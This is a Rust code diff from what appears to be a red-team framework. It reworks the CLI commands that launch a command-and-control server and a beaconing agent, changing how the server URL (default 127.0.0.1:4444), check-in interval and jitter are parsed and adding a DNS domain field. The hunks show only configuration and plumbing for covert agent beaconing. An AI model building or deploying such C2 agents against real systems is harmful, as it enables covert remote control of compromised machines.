@@ -103,10 +103,8 @@ impl AgentCommand {
 
         let config = AgentServerConfig {
             bind_addr: addr,
-            use_tls: false,
-            cert_path: None,
-            key_path: None,
             db_path: Some("redblue.rdb".to_string()),
+            ..Default::default()
         };
 
         let mut server = AgentServer::new(config);
@@ -119,37 +117,29 @@ impl AgentCommand {
     }
 
     fn start_agent(&self, ctx: &CliContext) -> Result<(), String> {
-        let url = ctx.target.as_ref().ok_or("Missing C2 server URL")?;
-        let interval_secs = ctx
-            .get_flag_or("interval", "60")
-            .parse::<u64>()
+        let server_url = ctx
+            .flags
+            .get("server")
+            .map(|s| s.as_str())
+            .unwrap_or("http://127.0.0.1:4444");
+
+        let interval: u64 = ctx
+            .flags
+            .get("interval")
+            .map(|s| s.parse().unwrap_or(60))
             .unwrap_or(60);
-        let jitter = ctx
-            .get_flag_or("jitter", "0.1")
-            .parse::<f32>()
-            .unwrap_or(0.1);
 
-        let format = ctx.get_output_format();
-        let is_json = format == crate::cli::format::OutputFormat::Json;
-
-        if is_json {
-            println!("{{");
-            println!("  \"action\": \"connect\",");
-            println!("  \"status\": \"starting\",");
-            println!("  \"server_url\": \"{}\",", url.replace('"', "\\\""));
-            println!("  \"interval_secs\": {},", interval_secs);
-            println!("  \"jitter\": {}", jitter);
-            println!("}}");
-        } else {
-            Output::header("Starting Agent");
-            Output::item("C2 Server", url);
-            Output::item("Interval", &format!("{}s", interval_secs));
-        }
+        let jitter: f32 = ctx
+            .flags
+            .get("jitter")
+            .map(|s| s.parse().unwrap_or(10.0))
+            .unwrap_or(10.0);
 
         let config = AgentConfig {
-            server_url: url.clone(),
-            interval: Duration::from_secs(interval_secs),
-            jitter,
+            server_url: server_url.to_string(),
+            dns_domain: None, // Can be added as a flag later
+            interval: Duration::from_secs(interval),
+            jitter: jitter / 100.0,
         };
 
         let mut agent = AgentClient::new(config);
